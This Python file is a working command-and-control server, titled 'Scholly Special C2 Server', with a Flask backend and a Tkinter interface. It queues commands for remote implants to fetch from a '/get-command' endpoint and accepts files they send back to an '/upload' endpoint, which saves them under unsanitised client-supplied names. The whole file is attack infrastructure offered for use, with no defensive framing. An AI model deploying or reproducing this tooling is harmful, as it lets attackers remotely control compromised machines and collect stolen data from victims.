import tkinter as tk
from tkinter import filedialog, messagebox
import requests
import threading
import os
import socket
from flask import Flask, request, jsonify

app = Flask(__name__)

commandToExecute = ""
uploadFolder = './uploads'
if not os.path.exists(uploadFolder):
    os.makedirs(uploadFolder)

@app.route('/send-command', methods=['POST'])
def send_command():
    global commandToExecute
    data = request.get_json()
    if 'command' in data:
        commandToExecute = data['command']
        return jsonify({"status": "Command received"})
    return jsonify({"status": "No command provided"}), 400

@app.route('/get-command', methods=['GET'])
def get_command():
    global commandToExecute
    return jsonify({"command": commandToExecute})

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    file.save(os.path.join(uploadFolder, file.filename))
    return jsonify({"status": "File received"})

# Function to get the IP address of the host
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external host (google works, but you can do whatever)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception as e:
        ip = "127.0.0.1"  # Fallback to localhost if no external connection is available
    finally:
        s.close()
    return ip

# Start the Flask server in a separate thread
def start_server():
    app.run(host='0.0.0.0', port=80, ssl_context=('cert.pem', 'key.pem'))

# GUI Application
class C2GUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Scholly Special C2 Server")
        
        # Display server's IP address
        self.server_ip = get_ip_address()
        self.ip_label = tk.Label(root, text=f"Server IP: {self.server_ip}")
        self.ip_label.pack(pady=5)
        
        # Command section
        self.command_label = tk.Label(root, text="Command to Execute:")
        self.command_label.pack(pady=5)

        self.command_entry = tk.Entry(root, width=50)
        self.command_entry.pack(pady=5)

        self.send_button = tk.Button(root, text="Send Command", command=self.send_command)
        self.send_button.pack(pady=5)

        # Uploads section
        self.uploads_label = tk.Label(root, text="Received Uploads:")
        self.uploads_label.pack(pady=10)

        self.uploads_listbox = tk.Listbox(root, width=50, height=10)
        self.uploads_listbox.pack(pady=5)

        self.refresh_button = tk.Button(root, text="Refresh Uploads", command=self.refresh_uploads)
        self.refresh_button.pack(pady=5)

        # Start the Flask server in the background
        self.server_thread = threading.Thread(target=start_server)
        self.server_thread.daemon = True
        self.server_thread.start()

    def send_command(self):
        command = self.command_entry.get()
        if not command:
            messagebox.showwarning("Input Error", "Please enter a command.")
            return
        
        try:
            # Send command via Flask
            url = f"http://{self.server_ip}:80/send-command"
            response = requests.post(url, json={"command": command})
            if response.status_code == 200:
                messagebox.showinfo("Success", "Command sent successfully!")
            else:
                messagebox.showerror("Error", "Failed to send the command.")
        except Exception as e:
            messagebox.showerror("Error", f"Could not send command: {e}")

    def refresh_uploads(self):
        self.uploads_listbox.delete(0, tk.END)  # Clear the current list
        
        # List all files in the uploads folder
        if os.path.exists(uploadFolder):
            for file_name in os.listdir(uploadFolder):
                self.uploads_listbox.insert(tk.END, file_name)
        else:
            messagebox.showwarning("No Uploads", "No files found in the uploads folder.")

# Create the Tkinter root and run the app
if __name__ == '__main__':
    root = tk.Tk()
    gui = C2GUI(root)
    root.mainloop()
